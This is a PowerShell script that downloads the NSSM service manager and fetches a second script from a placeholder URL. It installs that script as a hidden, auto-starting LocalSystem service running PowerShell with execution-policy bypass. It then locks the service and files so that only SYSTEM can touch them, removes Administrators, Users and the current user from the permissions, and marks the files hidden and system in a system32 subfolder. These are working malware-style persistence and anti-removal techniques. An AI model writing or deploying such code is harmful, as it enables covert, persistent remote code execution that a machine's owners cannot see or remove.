# script must run as admin/SYSTEM
param(
    [string]$rootPath
)

$paths = @(
    "$env:windir\system32\config\systemprofile\AppData\Local"
)

$nssmUrl = "https://nssm.cc/release/nssm-2.24.zip"
$nssmFolder = "$env:windir\system32\wbem\nssm"
$nssmexe = "$nssmFolder\nssm.exe"

if(($rootPath -eq "") -or ($rootPath -eq $null)){
    $rootPath = $paths[$(Get-Random -Minimum 0 -Maximum $paths.Length)]
    $rootPath = "$rootPath\root.ps1"
}

$idx = Get-Random -Minimum 0 -Maximum $paths.Length
$scriptPath = $paths[$idx]
$scriptPath = "$scriptPath\root_mon.ps1"

$serviceName = "MyRootMonService"
$exePath = "powershell.exe"
$arguments = "-ep bypass -noP -w hidden $scriptPath -rootPath $rootPath"
$downloadPath = "$env:temp\nssm.zip"

if(-not(Test-Path -Path $nssmFolder -PathType Container)){
    New-Item -Path $nssmFolder -ItemType Directory -Force
}

if(-not(Test-Path -Path $nssmexe)){
    if(-not(Test-Path -Path $downloadPath)){
        iwr -Uri $nssmUrl -OutFile $downloadPath
    }
    Expand-Archive -Path $downloadPath -DestinationPath $env:temp
    Move-Item -Path "$env:temp\nssm-2.24\win64\nssm.exe" -Destination $nssmexe
}

if(-not(Test-Path -Path $scriptPath -PathType Leaf)){
    iwr -Uri "ROOT_MON.ps1_URI" -OutFile $scriptPath
}

Remove-Item -Path $downloadPath -Force -Recurse
Remove-Item -Path "$env:temp\nssm-2.24" -Force -Recurse

if(Get-Service -Name $serviceName -ErrorAction SilentlyContinue){
    & $nssmexe stop $serviceName
    & $nssmexe remove $serviceName confirm
}

& $nssmexe install $serviceName $exePath $arguments
& $nssmexe set $serviceName Start SERVICE_AUTO_START
& $nssmexe set $serviceName ObjectName "LocalSystem"
& $nssmexe set $serviceName AppExit Default Exit
& $nssmexe set $serviceName AppExit 0 Exit
& $nssmexe set $serviceName AppPriority REALTIME_PRIORITY_CLASS
& $nssmexe set $serviceName AppStdout "$env:userprofile\Downloads\root_mon_srv.log"
& $nssmexe set $serviceName AppStderr "$env:userprofile\Downloads\root_mon_srv.log.error"
& $nssmexe start $serviceName

$SDDL = "O:SYD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;SY)"
sc.exe sdset $serviceName $SDDL

takeown /F $nssmexe /A /R /D Y 2>&1 | Out-Null
takeown /F $scriptPath /A /R /D Y 2>&1 | Out-Null

#  Set SYSTEM as owner (prevents inheritance)
icacls $nssmexe /setowner "NT AUTHORITY\SYSTEM" /T /Q 2>&1 | Out-Null
icacls $scriptPath /setowner "NT AUTHORITY\SYSTEM" /T /Q 2>&1 | Out-Null

# Remove inheritance and grant SYSTEM full control
icacls $nssmexe /grant:r "NT AUTHORITY\SYSTEM:F" /T /Q 2>&1 | Out-Null
icacls $nssmexe /inheritance:r /grant:r "NT AUTHORITY\SYSTEM:F" /T /Q 2>&1 | Out-Null
icacls $scriptPath /grant:r "NT AUTHORITY\SYSTEM:F" /T /Q 2>&1 | Out-Null
icacls $scriptPath /inheritance:r /grant:r "NT AUTHORITY\SYSTEM:F" /T /Q 2>&1 | Out-Null

# Remov all other users/groups (optional safety measure)
icacls $nssmexe /remove "Administrators" "Users" "Authenticated Users" "Everyone" /T /Q 2>&1 | Out-Null
icacls $nssmexe /remove:g "BUILTIN\Administrators" "BUILTIN\Users" "Everyone" "NT AUTHORITY\Authenticated Users" /T /Q 2>&1 | Out-Null
icacls $scriptPath /remove "Administrators" "Users" "Authenticated Users" "Everyone" /T /Q 2>&1 | Out-Null
icacls $scriptPath /remove:g "BUILTIN\Administrators" "BUILTIN\Users" "Everyone" "NT AUTHORITY\Authenticated Users" /T /Q 2>&1 | Out-Null

# 4. Explicitly remove your user account
icacls $nssmexe /remove:g "$env:computername\$env:username" /T /Q 2>&1 | Out-Null
icacls $scriptPath /remove:g "$env:computername\$env:username" /T /Q 2>&1 | Out-Nulls


attrib +h +s +r $nssmFolder
attrib +h +s +r $scriptPath